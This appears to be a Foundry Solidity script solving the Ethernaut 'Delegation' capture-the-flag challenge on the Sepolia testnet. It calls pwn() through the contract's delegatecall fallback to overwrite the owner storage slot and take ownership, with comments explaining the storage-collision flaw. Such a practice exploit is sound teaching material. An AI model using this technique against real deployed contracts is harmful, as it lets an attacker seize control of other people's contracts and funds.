// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Delegation, Delegate} from "../src/Delegation.sol";

// Our Instance address: https://sepolia.etherscan.io/address/0x7e63db5114372a539a63742a358c0a9428cfbb11

contract DelegationSolution is Script {
    // $ source .env      # This is to store the environmental variables in the shell session
    // $ forge script script/Delegation.s.sol --tc DelegationSolution --rpc-url $SEPOLIA_RPC_URL --broadcast --verify -vvvv

    Delegation delegationInstance = Delegation(0x7E63db5114372a539a63742A358c0a9428CfbB11);

    function run() external {
        // Deploy Telephone contract (It is better to deploy your instance for the contract to avoid errors)
        if (address(delegationInstance) == address(0)) {
            delegationInstance = _deployDelegationContract();
        }
        // We will simulate the attack by the second address, whici is in the .env file
        uint256 attackerPrivateKey = vm.envUint("PRIVATE_KEY_2");
        vm.startBroadcast(attackerPrivateKey);

        // - In `Delegation` contract, it fires function in `Delegate` contract in his context using `delegatecall`
        // - `Delegate` contract has a method `pwn` that changes the first storage slot (owner)
        // - `Delegation` contract first storage slot is also the `owner` variable
        // - If we delegate called to `pwn` function we will change the first storage slot in the `Delegation` contract
        // - `owner` variable lies in the first slot so it will be changed to the caller address, and we will path the challenge
        console.log("owner:", delegationInstance.owner());
        (bool success,) = address(delegationInstance).call(abi.encodeWithSignature("pwn()"));
        require(success, "Failed to delegateCall");
        console.log("new owner:", delegationInstance.owner());

        vm.stopBroadcast();
    }

    function _deployDelegationContract() internal returns (Delegation) {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        Delegate delegate = new Delegate(vm.envAddress("MY_ADDRESS"));
        Delegation delegation = new Delegation(address(delegate));
        console.log("Delegate address:", address(delegate));
        console.log("Delegation address:", address(delegation));
        vm.stopBroadcast();
        return delegation;
    }
}
